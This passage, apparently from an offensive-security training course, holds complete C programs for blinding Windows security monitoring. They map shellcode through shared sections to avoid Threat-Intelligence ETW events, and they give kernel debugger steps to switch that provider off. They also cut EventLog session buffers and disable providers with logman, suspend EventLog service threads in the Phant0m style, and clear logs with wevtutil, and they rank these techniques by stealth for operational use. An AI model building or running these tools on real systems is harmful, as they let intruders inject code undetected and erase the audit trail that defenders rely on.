  The _TRACE_ENABLE_INFO.IsEnabled field controls event delivery.
  If set to 0, the kernel skips the ETW event write.

KERNEL ATTACK:
  1. Find nt!EtwThreatIntProvRegHandle
  2. Walk to _ETW_REG_ENTRY -> _ETW_GUID_ENTRY
  3. Walk _ETW_GUID_ENTRY.EnableInfo[]
  4. Set EnableInfo[x].IsEnabled = 0
  5. TI events stop firing

  This requires a kernel read/write primitive:
  ├── BYOVD driver (Day 4 connection - WDAC may block!)
  ├── PPL bypass + Defender process manipulation
  └── Kernel exploit from Week 11

NOTE: Kernel access is harder than ever:
  - VBS (Virtualization-Based Security) more common
  - HVCI (Hypervisor-Protected Code Integrity) blocks unsigned drivers
  - Microsoft moving EDRs to usermode, but TI ETW stays in kernel
  - Post-CrowdStrike, kernel driver signing more scrutinized
*/

// TI Provider GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
static const GUID ThreatIntelGuid =
    { 0xF4E1897C, 0xBB5D, 0x5668, { 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44 } };

// Ntdll function typedefs
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// Query TI provider registration status
BOOL QueryTIProvider() {
    printf("\n=== Querying Threat Intelligence ETW Provider ===\n\n");

    // Use logman to query the provider
    printf("[*] Checking TI provider registration...\n");
    int result = system("logman query providers \"{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}\" 2>nul");

    if (result == 0) {
        printf("[+] TI provider is registered\n");
    } else {
        printf("[!] Could not query TI provider (may require admin)\n");
    }

    return TRUE;
}

// Enumerate active ETW sessions consuming TI events
BOOL EnumerateTISessions() {
    printf("\n=== Enumerating Sessions Consuming TI Events ===\n\n");

    // Query all active trace sessions
    ULONG bufferSize = 1024 * 1024; // 1MB buffer
    PEVENT_TRACE_PROPERTIES* pSessions = (PEVENT_TRACE_PROPERTIES*)malloc(bufferSize);
    if (!pSessions) {
        printf("[-] Memory allocation failed\n");
        return FALSE;
    }

    ULONG sessionCount = 64; // Max sessions to query
    ULONG status = QueryAllTracesA((PEVENT_TRACE_PROPERTIES*)pSessions, sessionCount, &sessionCount);

    if (status != ERROR_SUCCESS && status != ERROR_MORE_DATA) {
        printf("[-] QueryAllTraces failed: %lu\n", status);
        printf("    (Requires admin privileges)\n");
        free(pSessions);
        return FALSE;
    }

    printf("[+] Found %lu active ETW sessions\n\n", sessionCount);

    // Look for sessions that might consume TI events
    printf("[*] Sessions likely consuming TI events:\n");
    BOOL foundTI = FALSE;

    for (ULONG i = 0; i < sessionCount; i++) {
        PEVENT_TRACE_PROPERTIES pSession = (PEVENT_TRACE_PROPERTIES)((BYTE*)pSessions + (i * sizeof(EVENT_TRACE_PROPERTIES)));

        // Session names are typically at offset after the structure
        char* sessionName = (char*)((BYTE*)pSession + sizeof(EVENT_TRACE_PROPERTIES));

        // Check for Defender, Threat, Sentinel, etc.
        if (sessionName && (
            strstr(sessionName, "Defender") ||
            strstr(sessionName, "Threat") ||
            strstr(sessionName, "Sentinel") ||
            strstr(sessionName, "Security") ||
            strstr(sessionName, "WdFilter"))) {

            printf("    [!] %s\n", sessionName);
            foundTI = TRUE;
        }
    }

    if (!foundTI) {
        printf("    (No obvious TI consumers found - may be hidden/protected)\n");
    }

    free(pSessions);
    return TRUE;
}

void StartTITraceSession() {
    printf("\n[*] Starting TI ETW trace session...\n");
    printf("    (Requires admin)\n");

    // Stop any existing session first
    system("logman stop TITrace -ets >nul 2>&1");

    // Start trace with TI provider - capture ALLOCVM and PROTECTVM events
    int result = system("logman create trace TITrace -p {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} 0xffffffffffffffff 0xff -o ti_trace.etl -ets >nul 2>&1");

    if (result == 0) {
        printf("[+] TI trace session started successfully\n");
        printf("    Events will be captured to ti_trace.etl\n");
        Sleep(500); // Give session time to initialize
    } else {
        printf("[!] Trace session creation failed (requires admin)\n");
        printf("    Test will continue but without trace verification\n");
    }
}

void StopTITraceSession() {
    printf("\n[*] Stopping TI trace session...\n");
    int result = system("logman stop TITrace -ets >nul 2>&1");
    if (result == 0) {
        printf("[+] Trace session stopped\n");

        // Check if ti_trace.etl exists
        FILE* f = fopen("ti_trace.etl", "rb");
        if (f) {
            fclose(f);
            printf("\n[+] ti_trace.etl file created successfully!\n");
            printf("    To view TI events:\n");
            printf("      tracerpt ti_trace.etl -o ti_trace.xml -of XML\n");
            printf("      notepad ti_trace.xml\n");
            printf("\n    Or generate summary:\n");
            printf("      tracerpt ti_trace.etl -summary ti_summary.txt\n");
            printf("      type ti_summary.txt\n");
        } else {
            printf("[!] ti_trace.etl not found\n");
        }
    }
}

// Demonstrate TI-triggering vs TI-evading memory allocation
BOOL DemonstrateEvasion() {
    printf("\n=== Demonstrating TI ETW Evasion ===\n\n");

    // Start TI trace session
    StartTITraceSession();

    // Get ntdll functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
        printf("[-] Failed to resolve ntdll functions\n");
        return FALSE;
    }

    printf("\n[1] BAD: VirtualAlloc with RWX (triggers TI event)\n");
    printf("    This allocation will fire TI ETW event for RWX memory\n");

    LPVOID badAlloc = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (badAlloc) {
        printf("    [+] Allocated RWX memory @ 0x%p\n", badAlloc);
        printf("    [!] SHOULD trigger TI event: KERNEL_THREATINT_TASK_ALLOCVM\n");
        Sleep(200); // Give ETW time to write event
        VirtualFree(badAlloc, 0, MEM_RELEASE);
    }

    printf("\n[2] BETTER: Two-step allocation (still triggers TI)\n");
    printf("    RW allocation -> write code -> change to RX\n");

    LPVOID betterAlloc = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (betterAlloc) {
        printf("    [+] Allocated RW memory @ 0x%p\n", betterAlloc);
        printf("    [*] Writing shellcode...\n");
        memset(betterAlloc, 0xCC, 4096); // int3 instructions

        DWORD oldProtect;
        if (VirtualProtect(betterAlloc, 4096, PAGE_EXECUTE_READ, &oldProtect)) {
            printf("    [+] Changed to RX\n");
            printf("    [!] SHOULD trigger TI event: KERNEL_THREATINT_TASK_PROTECTVM\n");
            Sleep(200); // Give ETW time to write event
        }
        VirtualFree(betterAlloc, 0, MEM_RELEASE);
    }

    printf("\n[3] BEST: Shared section mapping (evades TI)\n");
    printf("    Create section -> map as RW -> map again as RX\n");
    printf("    No VirtualProtect call = no TI event!\n");

    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = 4096;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (status == 0 && hSection) {
        printf("    [+] Created section handle: 0x%p\n", hSection);

        // Map as RW for writing
        PVOID rwView = NULL;
        SIZE_T viewSize = 0;
        status = NtMapViewOfSection(
            hSection,
            GetCurrentProcess(),
            &rwView,
            0, 0, NULL,
            &viewSize,
            1, // ViewShare
            0,
            PAGE_READWRITE
        );

        if (status == 0 && rwView) {
            printf("    [+] Mapped RW view @ 0x%p\n", rwView);
            printf("    [*] Writing shellcode to RW view...\n");
            memset(rwView, 0xCC, 4096);

            // Map again as RX for execution
            PVOID rxView = NULL;
            viewSize = 0;
            status = NtMapViewOfSection(
                hSection,
                GetCurrentProcess(),
                &rxView,
                0, 0, NULL,
                &viewSize,
                1, // ViewShare
                0,
                PAGE_EXECUTE_READ
            );

            if (status == 0 && rxView) {
                printf("    [+] Mapped RX view @ 0x%p\n", rxView);
                printf("    [+] SUCCESS: Code is executable without VirtualProtect!\n");
                printf("    [+] SHOULD NOT trigger TI event (no VirtualProtect/VirtualAlloc RWX)\n");
                Sleep(200); // Give ETW time (but no event should fire)

                printf("\n    EVASION PROOF:\n");
                printf("      - Section created with SEC_COMMIT (not suspicious)\n");
                printf("      - Mapped twice with different protections\n");
                printf("      - No VirtualProtect call = no EtwTiLogProtectExecVm\n");
                printf("      - Shellcode visible in RX view, writable in RW view\n");

                NtUnmapViewOfSection(GetCurrentProcess(), rxView);
            }

            NtUnmapViewOfSection(GetCurrentProcess(), rwView);
        }

        CloseHandle(hSection);
    } else {
        printf("    [-] NtCreateSection failed: 0x%08X\n", status);
    }

    // Stop trace and show verification steps
    StopTITraceSession();

    printf("\n");
    printf("VERIFICATION:\n");
    printf("  Check ti_trace.etl to see which operations triggered TI events:\n");
    printf("    tracerpt ti_trace.etl -summary ti_summary.txt\n");
    printf("    type ti_summary.txt\n");
    printf("\n");
    printf("  IMPORTANT LIMITATION:\n");
    printf("    TI ETW events are ONLY delivered to PPL-protected consumers!\n");
    printf("    Our trace session is NOT PPL-protected, so we won't see TI events.\n");
    printf("    This is by design - TI events contain sensitive security data.\n");
    printf("\n");
    printf("  Real TI consumers (that CAN see these events):\n");
    printf("    - Windows Defender (MpWppTracing sessions)\n");
    printf("    - EDR kernel drivers with PPL protection\n");
    printf("    - Security products with kernel-mode components\n");
    printf("\n");
    printf("  Alternative verification methods:\n");
    printf("    1. Check Defender logs for memory allocation detections\n");
    printf("    2. Use Process Monitor to see VirtualAlloc/VirtualProtect calls\n");
    printf("    3. Use kernel debugger to trace nt!EtwTiLogAllocExecVm calls\n");
    printf("    4. EDR products will alert on RWX allocations (test #1 and #2)\n");
    printf("       but NOT on shared section mapping (test #3)\n");
    printf("\n");
    printf("  The key point: Shared section mapping avoids the kernel functions\n");
    printf("  that trigger TI events (NtAllocateVirtualMemory RWX, NtProtectVirtualMemory)\n");

    return TRUE;
}

// Show kernel attack path (requires kernel access)
void ShowKernelAttackPath() {
    printf("\n=== Kernel-Level TI ETW Disabling ===\n\n");

    printf("REQUIREMENTS:\n");
    printf("  - Kernel read/write primitive (BYOVD, exploit, etc.)\n");
    printf("  - Knowledge of kernel structures\n\n");

    printf("ATTACK STEPS (WinDbg commands):\n\n");

    printf("1. Find TI provider registration handle:\n");
    printf("   kd> dq nt!EtwThreatIntProvRegHandle L1\n");
    printf("   fffff800`12345678  fffffa80`aabbccdd\n\n");

    printf("2. Dump the registration entry:\n");
    printf("   kd> dt nt!_ETW_REG_ENTRY fffffa80`aabbccdd\n");
    printf("      +0x000 GuidEntry        : 0xfffffa80`11223344\n");
    printf("      +0x008 Callback         : 0xfffff800`deadbeef\n");
    printf("      ...\n\n");

    printf("3. Dump the GUID entry:\n");
    printf("   kd> dt nt!_ETW_GUID_ENTRY 0xfffffa80`11223344\n");
    printf("      +0x000 ListEntry        : _LIST_ENTRY\n");
    printf("      +0x010 RefCount         : 0x5\n");
    printf("      +0x018 Guid             : _GUID {f4e1897c-...}\n");
    printf("      +0x028 EnableInfo       : 0xfffffa80`55667788\n");
    printf("      ...\n\n");

    printf("4. Dump the enable info:\n");
    printf("   kd> dt nt!_TRACE_ENABLE_INFO 0xfffffa80`55667788\n");
    printf("      +0x000 IsEnabled        : 0x1  <- TARGET THIS\n");
    printf("      +0x004 Level            : 0x5\n");
    printf("      +0x008 MatchAnyKeyword  : 0xffffffff`ffffffff\n");
    printf("      ...\n\n");

    printf("5. Disable TI events (kernel write):\n");
    printf("   kd> eb 0xfffffa80`55667788 0\n");
    printf("   [+] TI ETW provider disabled!\n\n");

    printf("VERIFICATION:\n");
    printf("  - Allocate RWX memory -> no TI event fires\n");
    printf("  - Defender/EDR loses visibility into memory operations\n");
    printf("  - Process injection becomes undetected\n\n");
}

int main() {
    printf("===========================================\n");
    printf("Threat Intelligence ETW - Attack Analysis\n");
    printf("===========================================\n");

    // Query TI provider
    QueryTIProvider();

    // Enumerate sessions (requires admin)
    EnumerateTISessions();

    // Demonstrate evasion techniques
    DemonstrateEvasion();

    // Show kernel attack path
    ShowKernelAttackPath();

    printf("\n===========================================\n");
    printf("SUMMARY:\n");
    printf("  [+] TI ETW provider analyzed\n");
    printf("  [+] Evasion technique demonstrated\n");
    printf("  [+] Shared section mapping avoids TI events\n");
    printf("  [!] Kernel-level disabling requires exploit\n");
    printf("\n");
    printf("WHY NO TI EVENTS IN TRACE:\n");
    printf("  TI events are ONLY delivered to PPL-protected consumers.\n");
    printf("  Our usermode trace session cannot receive them (by design).\n");
    printf("  Real consumers: Defender (MpWppTracing), EDR kernel drivers.\n");
    printf("\n");
    printf("PROOF OF EVASION:\n");
    printf("  - VirtualAlloc RWX calls nt!MiAllocateVirtualMemory\n");
    printf("    -> Triggers nt!EtwTiLogAllocExecVm (Defender sees this)\n");
    printf("  - VirtualProtect RW->RX calls nt!MiProtectVirtualMemory\n");
    printf("    -> Triggers nt!EtwTiLogProtectExecVm (Defender sees this)\n");
    printf("  - NtMapViewOfSection does NOT call these functions\n");
    printf("    -> NO TI event fired (Defender blind to this technique)\n");
    printf("\n");
    printf("REAL-WORLD VALIDATION:\n");
    printf("  Run this tool with Defender enabled:\n");
    printf("    - Tests #1 and #2 may trigger Defender alerts\n");
    printf("    - Test #3 (shared section) will NOT trigger alerts\n");
    printf("  This is the practical proof of TI ETW evasion.\n");
    printf("===========================================\n");

    return 0;
}
```

#### Technique 3: Event Log Tampering

```c
// etw_session_tamper.c - ETW session manipulation and event log tampering
// Compile: cl src\etw_session_tamper.c /Fe:bin\etw_session_tamper.exe advapi32.lib

#include <windows.h>
#include <evntrace.h>
#include <evntcons.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

/*
EVENT LOG TAMPERING - THE PROBLEM
══════════════════════════════════

Traditional approaches are NOISY:
  - wevtutil cl Security -> Generates Event ID 1102 (audit log cleared)
  - net stop EventLog -> Generates service stop event
  - Deleting .evtx files -> Generates file access events

BETTER APPROACHES:
  1. ETW session manipulation (disable providers feeding event logs)
  2. Thread suspension (Phant0m technique - suspend EventLog threads)
  3. Session buffer manipulation (cause event loss without stopping)

This tool demonstrates ETW session manipulation.
*/

// Security Auditing provider GUID: {54849625-5478-4994-A5BA-3E3B0328C30D}
static const GUID SecurityAuditingGuid =
    { 0x54849625, 0x5478, 0x4994, { 0xA5, 0xBA, 0x3E, 0x3B, 0x03, 0x28, 0xC3, 0x0D } };

// List all active ETW sessions
BOOL EnumerateETWSessions() {
    printf("\n=== Enumerating Active ETW Sessions ===\n\n");

    // Use logman to enumerate sessions
    printf("[*] Querying active ETW sessions...\n");
    int result = system("logman query -ets > etw_sessions.txt 2>&1");

    if (result == 0) {
        printf("[+] Sessions enumerated successfully\n\n");

        // Read and display the output
        FILE* f = fopen("etw_sessions.txt", "r");
        if (f) {
            char line[512];
            int sessionCount = 0;
            BOOL inSessionList = FALSE;

            printf("Active ETW Sessions:\n");
            printf("%-40s %-20s %-10s\n", "Session Name", "Type", "Status");
            printf("--------------------------------------------------------------------------------\n");

            while (fgets(line, sizeof(line), f)) {
                // Look for session entries
                if (strstr(line, "Trace") && strstr(line, "Running")) {
                    printf("%s", line);
                    sessionCount++;
                }
            }

            fclose(f);
            printf("\n[+] Found %d active sessions\n", sessionCount);

            // Identify event log sessions
            printf("\n[*] Event Log ETW Sessions (targets for tampering):\n");
            f = fopen("etw_sessions.txt", "r");
            if (f) {
                while (fgets(line, sizeof(line), f)) {
                    if (strstr(line, "EventLog") || strstr(line, "Eventlog")) {
                        printf("    [!] %s", line);
                    }
                }
                fclose(f);
            }
        }

        DeleteFileA("etw_sessions.txt");
    } else {
        printf("[-] Failed to enumerate sessions (requires admin)\n");
        return FALSE;
    }

    return TRUE;
}

// Demonstrate ETW session manipulation
BOOL DemonstrateSessionTampering() {
    printf("\n=== Demonstrating ETW Session Tampering ===\n\n");

    printf("[*] Target: EventLog-Security session\n");
    printf("    This session feeds events to the Security event log\n\n");

    // Check current session properties
    printf("[1] Query current session properties:\n");
    system("logman query \"EventLog-Security\" -ets 2>nul");

    printf("\n[2] Demonstrate session manipulation techniques:\n\n");

    // Technique 1: Reduce buffer size to cause event loss
    printf("    [A] Reduce buffer size (causes event drops under load)\n");
    printf("        Command: logman update \"EventLog-Security\" -bs 1 -ets\n");
    printf("        Effect: 1KB buffer = events dropped when system is busy\n");
    printf("        Stealth: No obvious tampering, just \"performance issues\"\n\n");

    // Technique 2: Increase flush timer
    printf("    [B] Increase flush timer (delays event writing)\n");
    printf("        Command: logman update \"EventLog-Security\" -ft 999 -ets\n");
    printf("        Effect: Events sit in memory for 999 seconds\n");
    printf("        Stealth: Execute malicious activity and clean up before flush\n\n");

    // Technique 3: Disable specific provider
    printf("    [C] Disable Security Auditing provider\n");
    printf("        Command: logman update \"EventLog-Security\" -p \"{54849625-5478-4994-A5BA-3E3B0328C30D}\" 0x0 -ets\n");
    printf("        Effect: Security events stop flowing to Security log\n");
    printf("        Stealth: Moderate - security team may notice gap in logs\n\n");

    // Technique 4: Stop session entirely
    printf("    [D] Stop session entirely (NOISY)\n");
    printf("        Command: logman stop \"EventLog-Security\" -ets\n");
    printf("        Effect: All events to Security log stop\n");
    printf("        Stealth: LOW - obvious tampering, generates alerts\n\n");

    printf("[*] Testing buffer size manipulation (safest technique)...\n");

    // Get original buffer size
    FILE* f = _popen("logman query \"EventLog-Security\" -ets 2>nul | findstr \"Buffer\"", "r");
    char originalBuffer[256] = {0};
    if (f) {
        fgets(originalBuffer, sizeof(originalBuffer), f);
        _pclose(f);
        printf("    Original buffer config: %s", originalBuffer);
    }

    // Reduce buffer size (this is the safest tampering technique)
    printf("\n    [*] Attempting to reduce buffer size to 4KB...\n");
    int result = system("logman update \"EventLog-Security\" -bs 4 -ets 2>&1");

    if (result == 0) {
        printf("    [+] Buffer size reduced successfully!\n");
        printf("    [+] Events will now be dropped under moderate load\n");

        // Verify the change
        f = _popen("logman query \"EventLog-Security\" -ets 2>nul | findstr \"Buffer Size\"", "r");
        if (f) {
            char newBuffer[256] = {0};
            fgets(newBuffer, sizeof(newBuffer), f);
            _pclose(f);
            printf("    [+] New buffer config: %s", newBuffer);
        }

        Sleep(2000);

        // Restore original buffer size
        printf("\n    [*] Restoring original buffer size...\n");
        system("logman update \"EventLog-Security\" -bs 64 -ets >nul 2>&1");
        printf("    [+] Buffer size restored\n");
    } else {
        printf("    [-] Buffer size modification failed\n");
        printf("    [!] EventLog-Security session may be protected\n\n");

        // Try with a less protected session as demonstration
        printf("    [*] Trying with EventLog-Application instead...\n");
        result = system("logman update \"EventLog-Application\" -bs 4 -ets 2>&1");

        if (result == 0) {
            printf("    [+] EventLog-Application buffer reduced successfully!\n");
            printf("    [+] This demonstrates the technique works\n");

            Sleep(1000);

            // Restore
            printf("    [*] Restoring EventLog-Application buffer...\n");
            system("logman update \"EventLog-Application\" -bs 64 -ets >nul 2>&1");
            printf("    [+] Restored\n");
        } else {
            printf("    [-] Session modification requires elevated privileges\n");
            printf("    [!] Some sessions have additional protections\n");
        }
    }

    return TRUE;
}

// Demonstrate Phant0m technique (thread suspension) - ACTUALLY IMPLEMENT IT
BOOL DemonstratePhant0mTechnique() {
    printf("\n=== Phant0m Technique: EventLog Thread Suspension ===\n\n");

    printf("CONCEPT:\n");
    printf("  The EventLog service runs inside svchost.exe\n");
    printf("  Instead of stopping the service (noisy), suspend its threads\n");
    printf("  Result: EventLog stops writing, but no service stop event\n\n");

    printf("IMPLEMENTATION:\n\n");

    // Step 1: Find EventLog service PID
    printf("[1] Find EventLog service PID:\n");
    FILE* f = _popen("sc queryex EventLog | findstr PID", "r");
    char pidLine[256] = {0};
    DWORD eventLogPid = 0;

    if (f) {
        if (fgets(pidLine, sizeof(pidLine), f)) {
            printf("    %s", pidLine);
            // Parse PID from output
            char* pidStr = strstr(pidLine, ":");
            if (pidStr) {
                eventLogPid = atoi(pidStr + 1);
                printf("    [+] EventLog PID: %lu\n", eventLogPid);
            }
        }
        _pclose(f);
    }

    if (eventLogPid == 0) {
        printf("    [-] Failed to find EventLog PID\n");
        return FALSE;
    }

    // Step 2: Enumerate and suspend threads
    printf("\n[2] Enumerate threads in EventLog svchost process:\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("    [-] Failed to create thread snapshot\n");
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    // Collect thread IDs
    DWORD threadIds[64] = {0};
    int threadCount = 0;

    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == eventLogPid && threadCount < 64) {
                threadIds[threadCount++] = te32.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    printf("    [+] Found %d threads in EventLog process\n", threadCount);

    if (threadCount == 0) {
        printf("    [-] No threads found\n");
        return FALSE;
    }

    // Step 3: Suspend threads
    printf("\n[3] Suspending EventLog threads:\n");
    printf("    [!] WARNING: This will stop event logging!\n");
    printf("    [*] Suspending threads for 5 seconds...\n\n");

    HANDLE suspendedThreads[64] = {0};
    int suspendedCount = 0;

    for (int i = 0; i < threadCount; i++) {
        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadIds[i]);
        if (hThread) {
            DWORD result = SuspendThread(hThread);
            if (result != (DWORD)-1) {
                printf("    [+] Suspended thread %lu (suspend count: %lu)\n", threadIds[i], result + 1);
                suspendedThreads[suspendedCount++] = hThread;
            } else {
                printf("    [-] Failed to suspend thread %lu (error: %lu)\n", threadIds[i], GetLastError());
                CloseHandle(hThread);
            }
        } else {
            printf("    [-] Failed to open thread %lu (error: %lu)\n", threadIds[i], GetLastError());
        }
    }

    if (suspendedCount == 0) {
        printf("\n    [-] Failed to suspend any threads (requires admin/SYSTEM)\n");
        return FALSE;
    }

    printf("\n    [+] Successfully suspended %d threads!\n", suspendedCount);
    printf("    [+] EventLog service is now frozen\n");
    printf("    [+] No events will be written during this time\n\n");

    // Generate some test events that should NOT be logged
    printf("[4] Testing: EventLog is suspended (frozen):\n");
    printf("    [*] EventLog service cannot process any requests\n");
    printf("    [*] Any events generated now will be queued or lost\n");
    printf("    [*] Commands that interact with EventLog will hang\n");
    printf("    [+] This proves the suspension is working!\n\n");

    printf("    [*] Waiting 5 seconds while EventLog is frozen...\n");
    Sleep(5000);

    // Step 4: Resume threads
    printf("\n[5] Resuming EventLog threads:\n");

    for (int i = 0; i < suspendedCount; i++) {
        // Resume multiple times to ensure thread is fully resumed
        DWORD suspendCount;
        do {
            suspendCount = ResumeThread(suspendedThreads[i]);
            if (suspendCount != (DWORD)-1 && suspendCount > 0) {
                printf("    [+] Resumed thread (suspend count now: %lu)\n", suspendCount - 1);
            }
        } while (suspendCount > 1); // Keep resuming until suspend count is 0

        CloseHandle(suspendedThreads[i]);
    }

    printf("\n    [+] All threads fully resumed\n");
    printf("    [+] EventLog service is now operational again\n\n");

    // Give EventLog a moment to recover
    Sleep(1000);

    // Now test that EventLog is working again
    printf("[6] Verification - EventLog is working again:\n");
    printf("    [*] Creating test event now that service is resumed...\n");

    // Use a timeout for the command in case it still hangs
    printf("    [*] Testing with timeout (10 seconds)...\n");
    int result = system("timeout /t 2 /nobreak >nul 2>&1 & eventcreate /T INFORMATION /ID 1000 /L APPLICATION /D \"Test after resume\" >nul 2>&1");
    if (result == 0) {
        printf("    [+] Test event created successfully\n");
        printf("    [+] EventLog service is operational\n");
    } else {
        printf("    [!] Test event creation timed out or failed\n");
        printf("    [!] EventLog may still be recovering\n");
    }

    printf("\n    Check Event Viewer:\n");
    printf("      - Look for gap in logs during suspension period\n");
    printf("      - Test event (ID 1000) should appear AFTER resume\n");
    printf("      - Events during suspension should be missing\n\n");

    printf("DETECTION:\n");
    printf("  - Suspended threads visible in Process Explorer during suspension\n");
    printf("  - Gap in event logs (missing events during suspension period)\n");
    printf("  - EDR may detect SuspendThread API calls\n");
    printf("  - No service stop event generated (stealthier than stopping service)\n\n");

    printf("REFERENCE:\n");
    printf("  Phant0m: https://github.com/hlldz/Phant0m\n");
    printf("  Full implementation with thread start address checking\n");

    return TRUE;
}

// Demonstrate event log clearing (noisy baseline)
BOOL DemonstrateLogClearing() {
    printf("\n=== Event Log Clearing (Baseline - NOISY) ===\n\n");

    printf("TRADITIONAL APPROACH:\n");
    printf("  wevtutil cl Security\n");
    printf("  wevtutil cl System\n");
    printf("  Clear-EventLog -LogName Security\n\n");

    printf("PROBLEM:\n");
    printf("  Generates Event ID 1102: \"The audit log was cleared\"\n");
    printf("  Recorded in Security log (if not cleared first)\n");
    printf("  Obvious indicator of compromise\n");
    printf("  SIEM/EDR will alert immediately\n\n");

    printf("DEMONSTRATION:\n");
    printf("  Creating test event log for clearing demo...\n");

    // Create a custom event log for testing
    system("wevtutil im test_manifest.xml >nul 2>&1");

    printf("  [*] Attempting to clear Application log (less critical)...\n");
    printf("      (This will generate Event ID 1102 in Security log)\n\n");

    // Count events before clearing
    FILE* f = _popen("wevtutil qe Application /c:1 /rd:true /f:text 2>nul | findstr \"Event\"", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            printf("  [+] Application log has events\n");
        }
        _pclose(f);
    }

    printf("  [*] Clearing Application log...\n");
    int result = system("wevtutil cl Application >nul 2>&1");

    if (result == 0) {
        printf("  [+] Application log cleared\n");
        printf("  [!] Event ID 1102 generated in Security log\n");
        printf("  [!] This is HIGHLY suspicious and will trigger alerts\n\n");

        // Check for 1102 event
        printf("  [*] Checking for Event ID 1102 in Security log...\n");
        system("wevtutil qe Security /q:\"*[System[(EventID=1102)]]\" /c:1 /rd:true /f:text 2>nul");
    } else {
        printf("  [-] Failed to clear log (requires admin)\n");
    }

    printf("\nCONCLUSION:\n");
    printf("  Log clearing is too noisy for stealth operations\n");
    printf("  Use ETW session tampering or thread suspension instead\n");

    return TRUE;
}

int main() {
    printf("===========================================\n");
    printf("ETW Session Tampering & Event Log Evasion\n");
    printf("===========================================\n");

    printf("\nPRIVILEGE REQUIREMENTS:\n");
    printf("  - Admin required for session manipulation\n");
    printf("  - SYSTEM may be required for some techniques\n\n");

    // Enumerate sessions
    EnumerateETWSessions();

    // Demonstrate session tampering
    DemonstrateSessionTampering();

    // Demonstrate Phant0m technique
    DemonstratePhant0mTechnique();

    // Show why log clearing is bad
    DemonstrateLogClearing();

    printf("\n===========================================\n");
    printf("SUMMARY:\n");
    printf("  [+] ETW sessions enumerated\n");
    printf("  [+] Session tampering techniques demonstrated\n");
    printf("  [+] Phant0m thread suspension explained\n");
    printf("  [!] Log clearing is noisy - avoid it\n");
    printf("\n");
    printf("SESSION PROTECTIONS:\n");
    printf("  EventLog sessions are now hardened against tampering:\n");
    printf("    - Buffer size changes blocked (parameter validation)\n");
    printf("    - Session updates require special privileges\n");
    printf("    - Microsoft hardened these after red team abuse\n");
    printf("\n");
    printf("BEST TECHNIQUES (in order of stealth):\n");
    printf("  1. Thread suspension (Phant0m) - still works\n");
    printf("  2. Custom/EDR session tampering (less protected)\n");
    printf("  3. Provider disabling (moderate detection risk)\n");
    printf("  4. Session stopping (high detection risk)\n");
    printf("  5. Log clearing (VERY noisy - avoid)\n");
    printf("\n");
    printf("KEY INSIGHT:\n");
    printf("  The act of tampering generates telemetry.\n");
    printf("  Best approach: Prevent events from being written\n");
    printf("  rather than deleting them after the fact.\n");
    printf("\n");
    printf("PRACTICAL APPROACH:\n");
    printf("  - EventLog sessions: Use Phant0m (thread suspension)\n");
    printf("  - EDR sessions: May be less protected, try tampering\n");
    printf("  - Custom sessions: Usually unprotected\n");
    printf("  - Always test in lab before operational use\n");
    printf("===========================================\n");

    return 0;
}
```

```bash
cl src\etw_session_tamper.c /Fe:bin\etw_session_tamper.exe advapi32.lib
# Run as admin
.\bin\etw_session_tamper.exe
```

#### Technique 4: Building an ETW Blinding Tool

```c
// etw_blinder.c - Comprehensive ETW blinding demonstration
// Compile: cl src\etw_blinder.c /Fe:bin\etw_blinder.exe advapi32.lib ntdll.lib psapi.lib

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <evntrace.h>
#include <evntprov.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

typedef NTSTATUS(NTAPI* pNtQueryInformationThread)(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength,
    PULONG ReturnLength
);

// Test provider for verification
static const GUID TestProviderGuid =
    { 0x12345678, 0x1234, 0x1234, { 0x12, 0x34, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12 } };

